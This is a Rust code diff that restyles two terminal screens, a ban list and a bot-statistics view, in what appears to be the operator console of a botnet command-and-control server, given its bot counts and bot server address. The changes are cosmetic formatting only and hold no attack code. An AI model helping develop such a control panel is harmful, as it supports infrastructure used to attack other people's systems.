@@ -214,45 +214,25 @@ pub async fn handle_banlist_command(client: &Arc<Client>, state: &Arc<AppState>)
     
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
     
-    let width = get_terminal_width(state).await;
-    let side_width = 30;
-    let main_width = width - side_width - 2;
-    
-    // Top border
-    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
-    
-    // Title
-    let title = apply_gradient("Banned Users", 33, 51);
-    let title_text = format!("§ {} §", title);
-    let title_padding = main_width - visible_len("§ Banned Users §") - 2;
-    let left_pad = title_padding / 2;
-    let right_pad = title_padding - left_pad;
-    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
-        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
-    
-    client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
+    let title = apply_ice_gradient("Banned Users");
+    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
+    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
     
     if banned.is_empty() {
-        let msg = "No banned users";
-        let pad = main_width - visible_len(msg) - 2;
-        client.write(format!("\x1b[38;5;240m║ \x1b[38;5;245m{}\x1b[38;5;240m{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", msg, " ".repeat(pad)).as_bytes()).await?;
+        client.write(b"  \x1b[38;5;245mNo banned users found.\x1b[0m\n\r").await?;
     } else {
         for (i, user) in banned.iter().enumerate() {
             let user_str = format!("{} ({})", user.username, user.level.to_str());
             let expire_str = format!("Expired: {}", user.expire.format("%Y-%m-%d"));
             
-            let line_content = format!("  \x1b[38;5;196m{}\x1b[38;5;240m - \x1b[38;5;245m{}", user_str, expire_str);
-            let visible = visible_len(&format!("  {} ({}) - {}", user.username, user.level.to_str(), expire_str));
-            let padding = if main_width > visible + 1 { main_width - visible - 1 } else { 0 };
+            let user_gradient = apply_gradient(&user_str, 39 + (i as u8 % 50), 45 + (i as u8 % 50));
+            let expire_gradient = apply_gradient(&expire_str, 245, 250);
             
-            let right_panel = if i == 0 { "░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║" } else { "                              ║" };
-            
-            client.write(format!("\x1b[38;5;240m║{}{}\x1b[38;5;240m║{}\n\r", line_content, " ".repeat(padding), right_panel).as_bytes()).await?;
+            client.write(format!("  \x1b[38;5;196m[BANNED] \x1b[0m{} - {}\n\r", user_gradient, expire_gradient).as_bytes()).await?;
         }
     }
     
-    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
-    
+    client.write(b"\n\r").await?;
     client.set_breadcrumb("Home > Ban List").await;
     Ok(())
 }
@@ -435,41 +415,20 @@ pub async fn handle_botcount_command(client: &Arc<Client>, state: &Arc<AppState>
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
     let bot_count = state.bot_manager.get_bot_count().await;
     
-    let width = get_terminal_width(state).await;
-    let side_width = 30;
-    let main_width = width - side_width - 2;
-    
-    // Top border
-    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
-    
-    // Title
-    let title = apply_gradient("Bot Statistics", 39, 51);
-    let title_text = format!("§ {} §", title);
-    let title_padding = main_width - visible_len("§ Bot Statistics §") - 2;
-    let left_pad = title_padding / 2;
-    let right_pad = title_padding - left_pad;
-    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
-        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
-    
-    client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
+    let title = apply_ice_gradient("Bot Statistics");
+    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
+    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
     
     // Stats lines
-    let lines = [
-        format!("  Total Bots: {}", apply_gradient(&bot_count.to_string(), 39, 51)),
-        format!("  Status:     {}", apply_gradient("Online", 82, 118)),
-        format!("  Server:     {}", apply_gradient(&format!("{}:{}", state.config.read().await.bot_server_ip, state.config.read().await.bot_server_port), 39, 51))
-    ];
+    let count_gradient = apply_gradient(&bot_count.to_string(), 39, 51);
+    let status_gradient = apply_gradient("Online", 82, 118);
+    let server_gradient = apply_gradient(&format!("{}:{}", state.config.read().await.bot_server_ip, state.config.read().await.bot_server_port), 39, 51);
+
+    client.write(format!("  \x1b[38;5;245mTotal Bots: \x1b[0m{}\n\r", count_gradient).as_bytes()).await?;
+    client.write(format!("  \x1b[38;5;245mStatus:     \x1b[0m{}\n\r", status_gradient).as_bytes()).await?;
+    client.write(format!("  \x1b[38;5;245mServer:     \x1b[0m{}\n\r", server_gradient).as_bytes()).await?;
     
-    for (i, line) in lines.iter().enumerate() {
-        let visible = visible_len(line);
-        let padding = if main_width > visible + 1 { main_width - visible - 1 } else { 0 };
-        let right_panel = if i == 0 { "░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║" } else { "                              ║" };
-        
-        client.write(format!("\x1b[38;5;240m║{}{}\x1b[38;5;240m║{}\n\r", line, " ".repeat(padding), right_panel).as_bytes()).await?;
-    }
-    
-    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
-    
+    client.write(b"\n\r").await?;
     client.set_breadcrumb("Home > Bot Count").await;
     Ok(())
 }
